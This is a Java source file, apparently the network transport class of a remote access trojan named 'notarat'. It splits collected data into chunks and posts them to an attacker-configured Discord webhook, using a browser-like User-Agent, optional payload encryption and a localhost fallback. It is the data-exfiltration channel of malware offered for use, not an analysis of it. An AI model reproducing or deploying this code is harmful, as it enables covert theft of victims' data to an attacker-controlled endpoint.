package dev.xotic.notarat;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public final class Transport {

    private static final String WEBHOOK_URL   = "replace with your discord webhook";
    private static final String LOCAL_FALLBACK = "http://127.0.0.1:8080/hook";
    private static final int    CHUNK = 1800;
    private static final boolean ENCRYPT = false;

    private static String webhook() {
        String prop = System.getProperty("notarat.webhook");
        if (prop != null && !prop.isEmpty()) return prop;
        if (WEBHOOK_URL != null && !WEBHOOK_URL.isEmpty()) return WEBHOOK_URL;
        return LOCAL_FALLBACK;
    }

    public static void send(String data) {
        try {
            String body = ENCRYPT ? Security.encryptPayload(data) : data;
            String url  = webhook();
            int total   = Math.max(1, (body.length() + CHUNK - 1) / CHUNK);

            for (int i = 0; i < total; i++) {
                int from = i * CHUNK;
                int to   = Math.min(body.length(), from + CHUNK);
                post(url, body.substring(from, to), i + 1, total);
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    private static void post(String url, String part, int idx, int total) throws Exception {
        String jsonBody = "{\"content\": \"" + escapeJson(part)
                + "\", \"username\": \"nrt-" + idx + "/" + total + "\"}";

        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setRequestMethod("POST");
        c.setDoOutput(true);
        c.setConnectTimeout(10_000);
        c.setReadTimeout(15_000);
        c.setRequestProperty("Content-Type", "application/json");
        c.setRequestProperty("User-Agent", "Mozilla/5.0");
        c.setRequestProperty("Accept", "*/*");

        try (OutputStream os = c.getOutputStream()) {
            os.write(jsonBody.getBytes(StandardCharsets.UTF_8));
        }
        int status = c.getResponseCode();
        c.disconnect();
    }

    private static String escapeJson(String s) {
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            switch (c) {
                case '"':  sb.append("\\\""); break;
                case '\\': sb.append("\\\\"); break;
                case '\n': sb.append("\\n");  break;
                case '\r': sb.append("\\r");  break;
                case '\t': sb.append("\\t");  break;
                default:
                    if (c < 0x20) sb.append(String.format("\\u%04x", (int) c));
                    else sb.append(c);
            }
        }
        return sb.toString();
    }

    private Transport() {}
}